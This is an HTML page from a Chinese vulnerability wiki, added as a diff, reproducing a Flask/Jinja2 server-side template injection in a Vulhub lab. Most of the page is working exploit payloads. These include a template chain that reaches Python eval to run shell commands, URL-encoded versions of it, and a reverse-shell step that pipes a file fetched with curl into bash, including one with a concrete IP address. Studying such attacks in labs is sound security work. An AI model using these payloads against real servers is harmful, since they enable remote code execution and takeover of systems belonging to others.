@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Flask%20Jinja2%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Flask Jinja2 服务端模板注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Flask Jinja2 \u670d\u52a1\u7aef\u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Jackson-databind%20SSRF%26RCE%20CVE-2020-36179~36182/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Jackson-databind%20SSRF%26RCE%20CVE-2020-36179~36182/" class="btn btn-xs btn-link">
+        Jackson-databind SSRF&amp;RCE CVE-2020-36179~36182
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Fastjson%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-25845/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Fastjson%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-25845/" class="btn btn-xs btn-link">
+        Fastjson 远程代码执行漏洞 CVE-2022-25845
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="flask-jinja2">Flask Jinja2 服务端模板注入漏洞<a class="headerlink" href="#flask-jinja2" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>参考阅读：</p>
+<ul>
+<li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></li>
+<li><a href="http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates">http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates</a></li>
+</ul>
+<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Vulhub编译及运行测试环境：</p>
+<div class="highlight"><pre><span></span><code>docker-compose build
+docker-compose up -d
+</code></pre></div>
+<p>访问<code>http://your-ip:8000/?name={{233*233}}</code>，得到54289，说明SSTI漏洞存在。</p>
+<p><img alt="" src="../images/202202231628824.png" /></p>
+<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>获取eval函数并执行任意python代码的POC：</p>
+<div class="highlight"><pre><span></span><code>{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == &#39;catch_warnings&#39; %}
+  {% for b in c.__init__.__globals__.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if &#39;eval&#39; in b.keys() %}
+      {{ b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}
+</code></pre></div>
+<p>URL编码，添加以下Payload得到执行结果：</p>
+<div class="highlight"><pre><span></span><code>http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
+</code></pre></div>
+<p><img alt="image-20220223163008867" src="../images/202202231630914.png" /></p>
+<h3 id="shell">反弹shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h3>
+<p>通过curl的方式反弹shell，bash.html文件内容：</p>
+<div class="highlight"><pre><span></span><code>/bin/bash -i &gt;&amp; /dev/tcp/your-ip/2333 0&gt;&amp;1
+</code></pre></div>
+<p>构造Payload：</p>
+<div class="highlight"><pre><span></span><code>http://flask-ip:8000/?name={% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == &#39;catch_warnings&#39; %}
+  {% for b in c.__init__.__globals__.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if &#39;eval&#39; in b.keys() %}
+      {{ b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;curl your-ip/bash.html | bash&quot;).read()&#39;) }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}
+</code></pre></div>
+<p>URL编码后：</p>
+<div class="highlight"><pre><span></span><code>http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22curl%20101.42.237.61/bash.html%20|%20bash%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
+</code></pre></div>
+<p>浏览器访问，监听2333端口，成功接收反弹shell。</p>
+<p><img alt="image-20220223175620604" src="images/202202231756684.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Jackson-databind%20SSRF%26RCE%20CVE-2020-36179~36182/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Jackson-databind%20SSRF%26RCE%20CVE-2020-36179~36182/" class="btn btn-xs btn-link">
+        Jackson-databind SSRF&amp;RCE CVE-2020-36179~36182
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Fastjson%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-25845/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Fastjson%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-25845/" class="btn btn-xs btn-link">
+        Fastjson 远程代码执行漏洞 CVE-2022-25845
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
